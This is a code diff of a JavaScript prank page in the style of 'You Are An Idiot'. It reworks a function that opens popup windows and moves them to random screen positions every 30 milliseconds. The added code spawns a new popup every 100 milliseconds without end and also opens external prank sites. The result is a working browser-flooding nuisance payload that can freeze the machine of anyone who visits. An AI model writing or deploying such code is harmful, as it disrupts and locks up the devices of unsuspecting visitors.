@@ -23,59 +23,6 @@
         }
 
         function YouAreCooked() {
-                        // Spawning and bouncing popup
-            function spawnAndBounce(eee) {
-                var popup = window.open(eee+'.html', '_blank', 'width=400,height=300');
-                if (!popup) {
-                    alert("Popup blocked! Please allow popups for this site.");
-                    return;
-                }
-
-                setTimeout(function(){setInterval(function() {
-                    var x = popup.screenX;
-                    var y = popup.screenY;
-                    var width = popup.outerWidth;
-                    var height = popup.outerHeight;
-
-                    var screenWidth = window.screen.availWidth;
-                    var screenHeight = window.screen.availHeight;
-
-                    if (x <= 0 || x + width >= screenWidth) vx *= -1;
-                    if (y <= 0 || y + height >= screenHeight) vy *= -1;
-
-                    popup.moveBy(vx, vy);
-                }, 30)},1100);
-            }
-            // Randomizing position variant
-            function spawnRandom(eee) {
-                var maxX = screen.availWidth - scale;
-                var maxY = screen.availHeight - scale;
-                var popup = window.open(eee+'.html', '_blank', 'width=400,height=300');
-                if (!popup) {
-                    alert("Popup blocked! Please allow popups for this site.");
-                    return;
-                }
-
-                setTimeout(function(){setInterval(function() {
-                    var x = popup.screenX;
-                    var y = popup.screenY;
-                    var width = popup.outerWidth;
-                    var height = popup.outerHeight;
-
-                    var screenWidth = window.screen.availWidth;
-                    var screenHeight = window.screen.availHeight;
-
-                    popup.moveTo(Math.floor(Math.random() * screen.width), Math.floor(Math.random() * screen.height));
-                }, 30)},1100);
-            }
-
-            // Spawning and bouncing multiple popups
-            setInterval(function(){spawnRandom("lol3")},100)
-            spawnRandom("lol2");
-            spawnRandom("lol4");
-            spawnRandom("lol1");
-            spawnRandom("popup");
-            spawnRandom("https://youareanidiot.cc/lol");
             // Array of GIFs to cycle through
             var gifs = [
                 "https://media2.giphy.com/media/v1.Y2lkPTZjMDliOTUyM2tucDF0YTVhcmQyc25wNzk3ZnRpd3lxZGNubTdlMmhuNDZ1cmVtdCZlcD12MV9naWZzX3NlYXJjaCZjdD1n/n6szplK2CnuJW/giphy.gif",
@@ -103,6 +50,30 @@
             window.open('lol4.html', '_blank');
             window.open('https://hurr-durr.cc/HURRRRRRRRRRRRRRRRR.html', '_blank');
             window.open('https://youareanidiot.cc/lol.html', '_blank');
+
+            // Function to spawn a random popup
+            function spawnRandom(eee) {
+                var maxX = screen.availWidth - 400; // Adjust width as needed
+                var maxY = screen.availHeight - 300; // Adjust height as needed
+                var popup = window.open(eee + '.html', '_blank', 'width=400,height=300');
+                if (!popup) {
+                    alert("Popup blocked! Please allow popups for this site.");
+                    return;
+                }
+                setTimeout(function() {
+                    setInterval(function() {
+                        popup.moveTo(Math.floor(Math.random() * maxX), Math.floor(Math.random() * maxY));
+                    }, 30);
+                }, 1100);
+            }
+
+            // Spawning and bouncing multiple popups
+            setInterval(function() { spawnRandom("lol3"); }, 100);
+            spawnRandom("lol2");
+            spawnRandom("lol4");
+            spawnRandom("lol1");
+            spawnRandom("popup");
+            spawnRandom("https://youareanidiot.cc/lol");
 
             // Cycle through GIFs every second
             setInterval(function() {
